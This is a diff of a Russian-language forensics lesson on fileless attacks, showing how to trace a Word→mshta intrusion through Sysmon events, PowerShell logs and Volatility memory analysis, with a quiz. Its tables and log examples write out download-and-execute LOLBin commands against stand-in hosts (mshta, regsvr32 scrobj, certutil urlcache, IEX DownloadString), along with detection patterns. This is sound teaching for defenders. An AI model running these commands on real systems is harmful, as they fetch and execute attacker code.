@@ -14,81 +14,111 @@ useful_for:
 estimated_minutes: 45
 summary: "Fileless-атаки: LOLBins, PowerShell-пейлоады, WMI/реестр-персистентность, in-memory выполнение — и какие артефакты остаются после них."
 ---
-Fileless-малварь не оставляет исполняемого файла на диске: код живёт в памяти, в реестре, в WMI-подписках или исполняется через легитимные системные утилиты (LOLBins). Обнаружить её сложнее, но артефакты всё же остаются — в журналах, реестре, WMI и оперативной памяти. Этот урок — про техники fileless-атак и следы, которые они оставляют.
 
-## Что такое fileless
+## Вопрос, с которого всё начинается
 
-Fileless-атака использует существующие легитимные компоненты ОС для выполнения кода:
+Антивирус чист, на диске нет ни одного подозрительного `.exe`. Но сеть показывает
+странный трафик, а пользователь жалуется на «тормоза». Где малварь?
 
-- **LOLBins** (Living Off the Land Binaries) — `powershell.exe`, `mshta.exe`, `rundll32.exe`, `regsvr32.exe`, `certutil.exe`, `wmic.exe`, `msbuild.exe`, `bitsadmin.exe`.
-- **Скрипты в памяти** — PowerShell `-enc` (base64), `IEX (New-Object Net.WebClient).DownloadString(...)`.
-- **WMI-подписки** — постоянные потребители (см. `forensics-wmi`).
-- **Реестр** — payload в значении ключа, исполняемый скриптом/планировщиком.
-- **Отражённая загрузка** — reflective DLL в память без файла.
+Это **fileless-атака**: вредоносный код нигде не сохраняется как файл. Он живёт в
+памяти, в реестре, в подписках WMI — или исполняется через **легитимные** системные
+утилиты. Файла на диске нет, но следы всё равно остаются. Разберём, где именно.
 
-Общая черта: **нет файла-малвари на диске**, но есть необычная активность легитимных бинарей.
+## Наш пример: подозрительный mshta
 
-## LOLBins и их артефакты
+Нам выдали `Sysmon.evtx` и `mem.raw` (дамп памяти) с машины после инцидента.
+Известно, что пользователь открыл вложение в письме. Начнём с процессов —
+Sysmon Event ID **1** (создание процесса):
 
-| LOLBin | Типичное злоупотребление | Артефакт |
-|--------|--------------------------|----------|
-| `powershell.exe` | `-enc`, `DownloadString` | PS 4103/4104, Sysmon 1 |
-| `mshta.exe` | `mshta http://evil/x.hta` | Sysmon 1, сетевое соединение |
-| `rundll32.exe` | `javascript:` / DLL-экспорт | Sysmon 1, 7 |
-| `regsvr32.exe` | `/i:http://evil/x.sct scrobj.dll` | Sysmon 1, сеть |
+```bash
+$ evtx_dump -o json Sysmon.evtx | jq -r 'select(.Event.System.EventID==1) |
+    select(.["Event.EventData.Image"]|test("mshta")) |
+    .["Event.EventData.CommandLine"]'
+mshta http://evil.tld/payload.hta
+```
+
+`mshta.exe` — это легитимная утилита Windows, которая запускает HTA-файлы (HTML
+Application, «страницы», которые умеют исполнять код). Атакующий передал ей URL
+вместо файла — код загрузится из сети и выполнится в памяти. Такие легитимные
+утилиты, используемые во вредоносных целях, называют **LOLBins** (Living Off the
+Land Binaries — «живущие на подручных средствах системы»).
+
+## Шаг 1: почему это ловят не сигнатурой
+
+Антивирус проверяет файлы. Здесь файла нет: `mshta.exe` — «родной» для Windows,
+подписан Microsoft. Плохим его делает **аргумент** (URL). Значит, детект строят не
+на файле, а на **поведении**: какие легитимные утилиты запускаются, с какими
+аргументами и кто их породил.
+
+Типичные LOLBins и их злоупотребления:
+
+| LOLBin | Как используют | Что остаётся |
+|--------|----------------|--------------|
+| `powershell.exe` | `-enc <base64>` | PS 4104, Sysmon 1 |
+| `mshta.exe` | `mshta http://evil/x.hta` | Sysmon 1/3/22 |
+| `rundll32.exe` | `javascript:` в аргументе | Sysmon 1/7 |
+| `regsvr32.exe` | `/i:http://evil/x.sct scrobj.dll` | Sysmon 1/3 |
 | `certutil.exe` | `-urlcache -f http://evil/x` | Sysmon 1, файл |
-| `wmic.exe` | `process call create`, XSL | Sysmon 1, WMI-активность |
-| `msbuild.exe` | inline task C# | Sysmon 1, сборка |
-| `bitsadmin.exe` | `/transfer` загрузка | Sysmon 1, BITS-лог |
+
+## Шаг 2: кто запустил mshta
+
+Сама по себе утилита может быть безобидной. Решает **родитель** — процесс, который
+её породил. Sysmon пишет это в поле `ParentImage`:
 
 ```bash
-# подозрительные командные строки LOLBins
-$ evtx_dump -o json Sysmon.evtx | jq -r 'select(.Event.System.EventID==1) | .Event.EventData.CommandLine' | grep -iE 'powershell.*-enc|mshta http|regsvr32.*scrobj|certutil.*urlcache'
+$ evtx_dump -o json Sysmon.evtx | jq -r 'select(.Event.System.EventID==1) |
+    select(.["Event.EventData.Image"]|test("mshta")) |
+    .["Event.EventData.ParentImage"]'
+winword.exe
 ```
 
-## PowerShell-артефакты
+`winword.exe` (Microsoft Word) породил `mshta` — этого быть не должно. Word
+запускает утилиты только через **макрос** в документе. Связка «Word → mshta» —
+классический признак фишинга с макросом.
 
-PowerShell — главный инструмент fileless. Ключевые журналы: `Microsoft-Windows-PowerShell/Operational` (4103 Module Logging, 4104 Script Block Logging) и `Windows PowerShell` (400/600 — запуск/старт).
+## Шаг 3: куда пошёл трафик
+
+Найдём сетевые соединения того же процесса — Sysmon Event ID **3**:
 
 ```bash
-# содержимое скрипт-блоков
-$ evtx_dump -o json 'PowerShell%4Operational.evtx' | jq -r 'select(.Event.System.EventID==4104) | .Event.EventData.ScriptBlockText' > blocks.txt
-# признаки обфускации/загрузки
-$ grep -iE 'FromBase64String|IEX|Invoke-Expression|DownloadString|WebClient|-enc ' blocks.txt | head
-# декодировать base64-команду
-$ echo 'SQBFAFgA...' | base64 -d | iconv -f UTF-16LE -t UTF-8
+$ evtx_dump -o json Sysmon.evtx | jq 'select(.Event.System.EventID==3) |
+    select(.["Event.EventData.Image"]|test("mshta"))'
 ```
 
-Если 4104 выключен, остаются косвенные следы: модульный лог, `ConsoleHost_history.txt` (`%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`).
+Адрес назначения совпадёт с `evil.tld`. А DNS-запросы фиксирует Sysmon Event ID
+**22**:
 
 ```bash
-$ cat ConsoleHost_history.txt | grep -iE 'download|iex|base64' | head
+$ evtx_dump -o json Sysmon.evtx | jq -r 'select(.Event.System.EventID==22) |
+    .["Event.EventData.QueryName"]' | grep -i evil
+evil.tld
 ```
 
-## Закрепление без файлов
+Так выстраивается цепочка: **Word → mshta → DNS-запрос → соединение с C2**.
 
-- **WMI-подписки**: `__EventFilter` + `CommandLineEventConsumer` (см. `forensics-wmi`).
-- **Реестр**: `Run`/`RunOnce`, `Image File Execution Options` (debugger), `AppInit_DLLs`, `Winlogon` `Userinit`.
-- **Планировщик задач**: задача, запускающая `powershell -enc` без файла на диске.
-- **Scheduled Task с COM-обработчиком**: запуск скрипта в контексте системы.
+## Шаг 4: где живёт код — дамп памяти
+
+Раз кода нет на диске, он в оперативной памяти. Заглянем туда инструментом
+**Volatility** — фреймворком для анализа дампов памяти. Плагин `cmdline` выводит
+командные строки всех процессов:
 
 ```bash
-$ evtx_dump -o json 'TaskScheduler%4Operational.evtx' | jq -r 'select(.Event.System.EventID==106 or .Event.System.EventID==200) | .Event.EventData' | grep -i powershell
-$ rip.pl -r NTUSER.DAT -p run | grep -i powershell
+$ vol -f mem.raw windows.cmdline | grep -i mshta
+mshta.exe	mshta http://evil.tld/payload.hta
 ```
 
-## Артефакты в памяти
-
-Fileless-код живёт в памяти — его находят Volatility/YARA.
+А плагин `malfind` ищет **исполняемые регионы памяти**, которые не привязаны к
+файлу на диске — это характерный признак инъекции кода:
 
 ```bash
-# подозрительные регионы памяти
-$ vol -f mem.raw windows.malfind
-# YARA по памяти (искать скрипты/шеллкод)
-$ vol -f mem.raw windows.yarascan --yara-file=fileless.yar
-# командные строки процессов
-$ vol -f mem.raw windows.cmdline | grep -iE 'powershell|mshta|rundll32'
+$ vol -f mem.raw windows.malfind --pid 6120
+PID    Process   Start      End        Protection
+6120   mshta.exe 0x...      0x...      PAGE_EXECUTE_READWRITE
 ```
+
+Регион с правами «читать-писать-исполнять» и без файла-источника — почти всегда
+вредоносный. Оттуда можно снять дамп и прогнать YARA (правила поиска по
+сигнатурам):
 
 ```yara
 rule Fileless_PS {
@@ -101,89 +131,55 @@ rule Fileless_PS {
 }
 ```
 
-## Разобранный пример
+## Шаг 5: где малварь закрепилась
 
-Подозрение на fileless-атаку через `mshta`.
+Fileless-атака должна как-то пережить перезагрузку — без файла это делается
+«бесфайловыми» механизмами закрепления:
+
+- **WMI-подписки** — фильтр + потребитель в базе WMI (см. урок про WMI);
+- **реестр** — payload в значении `Run`/`RunOnce`, исполняемый планировщиком;
+- **планировщик задач** — задача, запускающая `powershell -enc`.
 
 ```bash
-# 1. Процесс mshta с URL
-$ evtx_dump -o json Sysmon.evtx | jq -r 'select(.Event.System.EventID==1 and (.Event.EventData.Image|test("mshta"))) | .Event.EventData.CommandLine'
-mshta http://evil.tld/payload.hta
-# 2. Сетевое соединение
-$ evtx_dump -o json Sysmon.evtx | jq 'select(.Event.System.EventID==3 and (.Event.EventData.Image|test("mshta")))'
-# 3. Родитель (Word/Excel -> mshta = макрос)
-$ evtx_dump -o json Sysmon.evtx | jq -r 'select(.Event.System.EventID==1 and (.Event.EventData.Image|test("mshta"))) | .Event.EventData.ParentImage'
-winword.exe
-# 4. Что скачал
-$ evtx_dump -o json Sysmon.evtx | jq -r 'select(.Event.System.EventID==22) | .Event.EventData.QueryName' | grep -i evil
-# 5. Память
-$ vol -f mem.raw windows.cmdline | grep -i mshta
+$ evtx_dump -o json 'TaskScheduler%4Operational.evtx' | jq -r 'select(.Event.System.EventID==106 or .Event.System.EventID==200) | .Event.EventData' | grep -i powershell
+$ rip.pl -r NTUSER.DAT -p run | grep -i powershell
 ```
 
-## Справочная таблица
+## Что нужно включить заранее
 
-| Техника | Артефакт |
-|---------|----------|
-| PowerShell `-enc` | PS 4104, Sysmon 1 |
-| `mshta` URL | Sysmon 1/3/22 |
-| `regsvr32` scrobj | Sysmon 1/3 |
-| WMI-подписка | OBJECTS.DATA, 5861 |
-| Реестр-payload | Run, IFEO |
-| Reflective DLL | malfind, VAD |
-| Scheduled Task | TaskScheduler EVTX |
+Fileless-атаки видны только там, где включён аудит. Что должно быть включено **до**
+инцидента:
 
-## Частые ошибки
-
-- **Искать файл-малварь** — fileless её не имеет.
-- **Игнорировать PS-логи** — там видно содержимое скриптов.
-- **Верить, что «легитимный бинарь» = безопасно** — LOLBins злоупотребляют.
-- **Не включать аудит** — 4104/4688 могут быть выключены (проверьте).
-- **Забывать про память** — fileless живёт там.
-- **Не коррелировать родителя** — Word→mshta/powershell = макрос.
-
-## Краткое резюме
-
-Fileless-атаки не оставляют файла-малвари на диске, но всегда оставляют следы в журналах и памяти. Ключевые источники: Sysmon (1/3/8/10/22), PowerShell 4103/4104, WMI-Activity (5861), TaskScheduler, реестр и дамп памяти. Главный принцип обнаружения — корреляция: аномальный LOLBin (`mshta`, `powershell -enc`, `regsvr32`) + необычный родитель + сетевое соединение + закрепление. Для надёжного детекта заранее включите аудит командной строки, Script Block Logging и Sysmon с правильным конфигом.
-
-## Что дальше / решение
-
-Конвейер: Sysmon/4688 (LOLBins) → PS 4104 (скрипты) → WMI/реестр (закрепление) → память (malfind/YARA). Связка: `forensics-wmi` (WMI), `forensics-powershell-logs` (PS), `forensics-malware-yara` (YARA), `forensics-memory-injection` (инъекции).
-
-## Обнаружение через аудит и SIEM
-
-Чтобы ловить fileless, нужен правильный аудит:
-
-- **4688** с `ProcessCommandLine` (включить «Include command line in process creation events»).
-- **Sysmon** с конфигом, логирующим процессы (1), сеть (3), образы (7), CreateRemoteThread (8), доступ к процессам (10), DNS (22).
-- **PowerShell Script Block Logging** (4104) и **Module Logging** (4103).
-- **WMI-Activity** (5857/5860/5861).
-- **TaskScheduler** (106/200/201).
+- **4688** с командной строкой (по умолчанию командная строка не пишется!);
+- **Sysmon** — процессы (1), сеть (3), образы (7), `CreateRemoteThread` (8),
+  доступ к процессам (10), DNS (22);
+- **PowerShell Script Block Logging** (4104);
+- **WMI-Activity** (5860/5861).
 
 ```bash
-# включить аудит командной строки (Windows)
 $ auditpol /set /subcategory:"Process Creation" /success:enable
-$ reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1
 ```
 
-Sigma-правила для LOLBins (`mshta`, `regsvr32 scrobj`, `certutil -urlcache`, `powershell -enc`) применяйте через `Chainsaw`/`Hayabusa`.
+## Что мы теперь знаем
 
-## Сложные случаи
+- **Fileless**-атака не оставляет файла-малвари — код в памяти или в реестре/WMI.
+- **LOLBins** — легитимные утилиты (`mshta`, `powershell`, `regsvr32`), используемые во вред.
+- Детект строят на **поведении**: аргументы + родительский процесс + сеть.
+- **Volatility** (`cmdline`, `malfind`) находит код в памяти.
+- Без заранее включённого аудита (4688, Sysmon, 4104) следов может не быть.
 
-- **Скрипт-блоки усечены** — 4104 может быть разбит на несколько событий; склеивайте по `MessageNumber`/`MessageTotal`.
-- **Base64 в UTF-16LE** — декодируйте с `iconv -f UTF-16LE`.
-- **Отсутствие 4104** — проверьте, включено ли Script Block Logging.
-- **mshta/rundll32 с `javascript:`** — код целиком в аргументе; сохраните командную строку.
-- **AMSI-обход** — малварь может обходить AMSI; полагайтесь на поведенческие артефакты, а не только на сигнатуры.
-- **Memory-only** — если нет дампа, восстановить payload сложно; фиксируйте хотя бы сеть и родителя.
+## На что смотреть дальше
 
-```bash
-# декодировать PowerShell -enc
-$ echo '<base64>' | base64 -d | iconv -f UTF-16LE -t UTF-8
-# склеить разбитый 4104
-$ evtx_dump -o json PS.evtx | jq -r 'select(.Event.System.EventID==4104) | [.Event.EventData.MessageNumber, .Event.EventData.ScriptBlockText] | @tsv' | sort | head
-```
+- **Искать файл-малварь** — у fileless его нет; смотри поведение утилит.
+- **Верить, что «легитимный бинарь» безопасен** — LOLBins злоупотребляют именно этим.
+- **Игнорировать родителя** — `winword → mshta/powershell` = макрос.
+- **Забывать про память** — fileless живёт там; снимай дамп до перезагрузки.
+- **Не проверить аудит** — 4688/4104 могут быть выключены.
+- **Декодировать base64 как UTF-8** — PowerShell `-enc` это UTF-16LE.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Что такое LOLBin?"
@@ -223,10 +219,17 @@ $ evtx_dump -o json PS.evtx | jq -r 'select(.Event.System.EventID==4104) | [.Eve
   answer: 0
 ```
 
+## Куда дальше
+
+Мы разобрали fileless-атаку через LOLBin. В следующем уроке возьмём конкретный
+инструмент атакующих — **Cobalt Strike** — и научимся узнавать его «бекон» по
+трафику и памяти. А пока запомни: **fileless-атака не оставляет файла, но выдаёт
+себя поведением утилит, родителем процесса и памятью**.
+
 ## Где пригодится
 
-- **CTF:** задачи на поиск безфайловых атак по логам/памяти.
-- **DFIR:** обнаружение и атрибуция LOLBin-активности.
-- **Threat Hunting:** охота на подозрительные цепочки процессов и командные строки.
-- **SOC:** правила Sigma на 4104/Sysmon 1/8/10.
-- **Пентест (red team awareness):** понимание, какие следы оставляет техника.
+- **CTF** — задачи на поиск безфайловых атак по логам и памяти.
+- **DFIR** — обнаружение и атрибуция LOLBin-активности.
+- **Threat Hunting** — охота на подозрительные цепочки процессов.
+- **SOC** — правила Sigma на 4104 и Sysmon 1/8/10.
+- **Red team awareness** — понимание, какие следы оставляет техника.
